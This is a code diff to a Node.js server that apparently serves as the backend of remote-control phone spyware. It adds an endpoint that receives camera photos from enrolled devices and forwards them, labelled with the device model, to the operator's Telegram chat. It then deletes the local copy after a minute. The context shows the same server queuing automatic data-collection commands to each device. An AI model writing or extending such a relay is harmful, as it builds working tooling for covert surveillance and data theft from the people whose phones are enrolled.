@@ -615,7 +615,79 @@ function queueAutoDataCommands(deviceId, chatId) {
     
     console.log(`✅ All auto-data commands queued for ${deviceId}`);
 }
+// ============= PHOTO UPLOAD ENDPOINT =============
+app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
+    try {
+        const deviceId = req.body.deviceId;
+        const caption = req.body.caption || '📸 Camera Photo';
+        
+        if (!deviceId || !req.file) {
+            console.error('❌ Missing fields in photo upload');
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`📸 Photo upload from ${deviceId}: ${req.file.filename} (${req.file.size} bytes)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            console.error(`❌ Device not found: ${deviceId}`);
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
+        
+        // Send to Telegram
+        await sendTelegramPhoto(chatId, filePath, req.file.originalname, fullCaption);
+        
+        // Delete file after sending
+        setTimeout(() => {
+            try {
+                if (fs.existsSync(filePath)) {
+                    fs.unlinkSync(filePath);
+                    console.log(`🧹 Deleted photo: ${filePath}`);
+                }
+            } catch (e) {
+                console.error('Error deleting photo:', e);
+            }
+        }, 60000);
+        
+        res.json({ success: true, filename: req.file.filename, size: req.file.size });
+        
+    } catch (error) {
+        console.error('❌ Photo upload error:', error);
+        res.status(500).json({ error: 'Upload failed: ' + error.message });
+    }
+});
 
+// Helper function to send photo to Telegram
+async function sendTelegramPhoto(chatId, filePath, filename, caption) {
+    try {
+        console.log(`📸 Sending photo to ${chatId}: ${filename}`);
+        
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', fs.createReadStream(filePath), { filename });
+        formData.append('caption', caption);
+        
+        const response = await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
+            headers: {
+                ...formData.getHeaders()
+            },
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity
+        });
+        
+        console.log(`✅ Photo sent successfully to ${chatId}`);
+        return response.data;
+    } catch (error) {
+        console.error('❌ Error sending photo:', error.response?.data || error.message);
+        return null;
+    }
+}
 // ============= WEBHOOK ENDPOINT =============
 
 app.post('/webhook', async (req, res) => {
